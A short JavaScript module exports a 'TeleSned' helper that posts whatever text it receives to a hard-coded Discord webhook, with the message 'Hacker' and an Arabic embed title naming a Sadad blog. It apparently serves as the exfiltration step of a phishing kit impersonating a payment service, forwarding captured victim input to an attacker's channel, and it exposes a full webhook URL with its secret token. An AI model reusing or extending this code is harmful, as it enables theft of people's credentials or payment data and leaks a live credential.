import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323962755824222229/zj2-VMcfKTpCWhYooQ3iBQHT0vfAFZVIkR4rGY47vnJyyDVrsV3JExnsO-2m3oJ6dgSz",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
